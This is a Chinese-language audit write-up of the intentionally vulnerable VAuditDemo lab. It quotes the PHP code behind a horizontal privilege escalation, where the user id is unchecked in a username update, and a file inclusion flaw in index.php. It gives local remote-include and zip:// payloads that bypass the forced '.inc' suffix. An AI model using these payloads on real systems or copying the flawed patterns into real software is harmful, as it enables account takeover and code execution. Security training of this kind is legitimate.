### 目录 ###
- - -
-  说明
-  审计过程
-  总结

### 说明 ###
- - -
V靶场全名(VAuditDemo_Debug),我这里简称V

### 审计过程 ###
- - -
这是我之前审计过的地方（我扔博客里了，这里就不在重复）：

<b>越权的发现</b>
代码路径：
```
\VAuditDemo-master\VAuditDemo_Debug\user\UpdateName.php
```
代码如下：
```php
<?php
include_once('../sys/config.php');
if (isset($_POST['submit']) && !empty($_POST['username']) ) { /*判断是否存在POST请求的submit和username参数*/

	if (strlen($_POST['username'])>16) { /*判断用户名是否长过16位*/
		$_SESSION['error_info'] = '用户名過長（用戶名長度<=16）';
		header('Location: edit.php');
		exit;
	}

	$clean_username = clean_input($_POST['username']);
	$clean_user_id = clean_input($_POST['id']);
	
	//判断用户名已是否存在
	$query = "SELECT * FROM users WHERE user_name = '$clean_username'"; /*b不存在SQL注入*/
    $data = mysql_query($query, $conn);
	if (mysql_num_rows($data) == 1) {
		$_SESSION['error_info'] = '用户名已存在';
		header('Location: edit.php');
		exit;
	}
	
	$query = "UPDATE users SET user_name = '$clean_username' WHERE user_id = '$clean_user_id'"; /*b不存在SQL注入*/
	mysql_query($query, $conn) or die("update error!");
	mysql_close($conn);
	//刷新缓存
	$_SESSION['username'] = $clean_username;
	header('Location: edit.php');
}
else {
	not_find($_SERVER['PHP_SELF']);
}

/*
1.先判断是否有POST请求
2.判断新的用户名是否长过16位
3.判断用户名是否存在
4.更新数据库名

PS：少了检测请求的ID是否等于用户的id，也就是说通过修改这个ID就能达到修改别的用户的名称实现平行越权
*/
?>
```
实验：
```
第一个用户：admins 密码：admin
第二个用户：我喜欢你 密码：111111
```
使用我喜欢你这个用户来改admins用户的用户名：
![kdXEex.png](https://s2.ax1x.com/2019/02/12/kdXEex.png)

修改前的数据库：
![kdXNtS.png](https://s2.ax1x.com/2019/02/12/kdXNtS.png)

Burp抓包重放：
![kdXdpQ.png](https://s2.ax1x.com/2019/02/12/kdXdpQ.png)

修改后的数据库：
![kdXwlj.png](https://s2.ax1x.com/2019/02/12/kdXwlj.png)

<b>文件包含漏洞</b>
在审计别的洞的时间用burp扫了一波，发现index.php居然有文件包含= =
burp扫描配置如下：
![kwVgN4.md.png](https://s2.ax1x.com/2019/02/12/kwVgN4.md.png)

![kwV24J.png](https://s2.ax1x.com/2019/02/12/kwV24J.png)

文件包含：
![kwVIu6.png](https://s2.ax1x.com/2019/02/12/kwVIu6.png)

index.php
```php
<?php 
require_once('sys/config.php');
require_once('header.php');
?>
<div class="row">
	<?php
	/* Include */
	if (isset($_GET['module'])){
		include($_GET['module'].'.inc');/*指定后缀*/
	}else{
	?>
	<div class="jumbotron" style="text-align: center;">
		<h1><b>VAuditDemo</b></h1>
		<p>一个简单的Web漏洞演练平台</p><br />
	</div>
	<div class="col-lg-12">
		<h2>用於演示講解PHP基本漏洞</h2>
		<p></p>
	</div>
	<?php
	}
	?>
</div>
		
<?php
require_once('footer.php');
?>
```
绕过方法有两种：
```
1.远程文件包含 要求：allow_url_fopen开启
2.zip协议  要求：zip协议没被禁止,知道绝对路径
```
远程包含payload如下：
```
http://127.0.0.1/index.php?module=http://127.0.0.1/1.txt?
```
![kwVvvt.png](https://s2.ax1x.com/2019/02/12/kwVvvt.png)

ZIP协议如下：
```
http://127.0.0.1/index.php?module=zip://I:\phpstudy\PHPTutorial\WWW\VAuditDemo-master\VAuditDemo_Debug\demo.zip%23
```
![kwZVvq.png](https://s2.ax1x.com/2019/02/12/kwZVvq.png)

压缩包图片：
![kwZmrV.png](https://s2.ax1x.com/2019/02/12/kwZmrV.png)

这里有个坑：就是你用zip协议的时候压缩包里面文件名一定要一样不然不行的，如果他指定后缀名
你就两个后缀名 比如：
```
指定后缀为：dd.txt 那么你压缩包里面就要放个dd.txt
指定后缀名为：.inc和上面一样那么压缩包放个.inc.inc
```
